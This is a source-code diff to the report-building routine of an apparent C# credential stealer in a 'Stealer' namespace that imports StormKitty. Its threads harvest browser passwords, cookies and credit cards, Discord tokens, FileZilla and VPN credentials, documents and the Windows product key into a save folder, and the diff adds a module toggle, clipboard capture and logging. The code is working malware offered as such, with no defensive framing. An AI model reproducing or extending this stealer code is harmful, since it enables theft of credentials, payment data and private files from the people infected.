@@ -2,6 +2,7 @@
 using System.IO;
 using System.Threading;
 using System.Collections.Generic;
+using StormKitty;
 
 namespace Stealer
 {
@@ -14,10 +15,11 @@ namespace Stealer
 
             try
             {
-                // Collect files
-                Threads.Add(new Thread(() =>
-                    FileGrabber.Run(sSavePath + "\\Grabber")
-                ));
+                // Collect files (documents, databases, images, source codes)
+                if (Config.GrabberModule == "1")
+                    Threads.Add(new Thread(() =>
+                        FileGrabber.Run(sSavePath + "\\Grabber")
+                    ));
 
                 // Chromium & Edge thread (credit cards, passwords, cookies, autofill, history, bookmarks)
                 Threads.Add(new Thread(() =>
@@ -30,13 +32,9 @@ namespace Stealer
                     Firefox.Recovery.Run(sSavePath + "\\Browsers")
                 ));
                 // Internet explorer thread (logins)
-                Threads.Add(new Thread(() => { 
-                    try
-                    {
-                        InternetExplorer.Recovery.Run(sSavePath + "\\Browsers");
-                    }
-                    catch { }
-                }));
+                Threads.Add(new Thread(() =>
+                    InternetExplorer.Recovery.Run(sSavePath + "\\Browsers")
+                ));
 
                 // Write discord tokens
                 Threads.Add(new Thread(() =>
@@ -86,7 +84,7 @@ namespace Stealer
 
                 // Write FileZilla
                 Threads.Add(new Thread(() =>
-                    FileZilla.WritePasswords(FileZilla.Steal(), sSavePath + "\\FileZilla")
+                    FileZilla.WritePasswords(sSavePath + "\\FileZilla")
                 ));
 
                 // Write VPNs
@@ -142,6 +140,11 @@ namespace Stealer
                     File.WriteAllText(sSavePath + "\\System\\ProductKey.txt",
                         ProductKey.GetWindowsProductKeyFromRegistry())
                 ));
+                // Clipboard text
+                Threads.Add(new Thread(() =>
+                    File.WriteAllText(sSavePath + "\\System\\Clipboard.txt",
+                        Clipper.Clipboard.GetText())
+                ));
                 // Get installed apps
                 Threads.Add(new Thread(() =>
                     InstalledApps.WriteAppsList(sSavePath + "\\System")
@@ -155,11 +158,10 @@ namespace Stealer
                 foreach (Thread t in Threads)
                     t.Join();
 
-                return true;
+                return Logging.Log("Report created", true);
             }
             catch (Exception ex) {
-                Console.WriteLine(ex);
-                return false; 
+                return Logging.Log("Failed to create report, error:\n" + ex, false);
             }
         }
     }
